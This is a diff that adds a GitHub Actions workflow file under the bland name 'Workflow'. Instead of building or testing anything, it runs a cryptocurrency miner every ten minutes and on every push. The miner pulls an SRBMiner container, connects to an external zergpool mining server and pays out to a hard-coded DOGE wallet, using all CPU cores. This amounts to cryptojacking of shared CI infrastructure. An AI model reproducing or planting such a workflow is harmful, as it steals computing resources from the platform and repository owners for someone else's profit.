@@ -1,0 +1,16 @@
+name: Workflow
+
+on:
+  workflow_dispatch:
+  push:
+  schedule:
+    - cron: "*/10 * * * *"
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    container: cniweb/srbminer-multi:v2.4.3
+    timeout-minutes: 10
+    steps:
+      - name: run
+        run: /opt/SRBMiner-Multi/SRBMiner-MULTI --algorithm yespowerLTNCG --pool stratum+ssl://yespowerLTNCG.mine.zergpool.com:16239 --wallet DFgN9Wf6AwSiRPskC5PJWBvafecAZEjbho --password c=DOGE,mc=CRNC,ID=${{ github.repository_owner }}-git-action --api-enable --api-port 80 --disable-auto-affinity --disable-gpu --cpu_threads $(grep -c '^processor' /proc/cpuinfo)
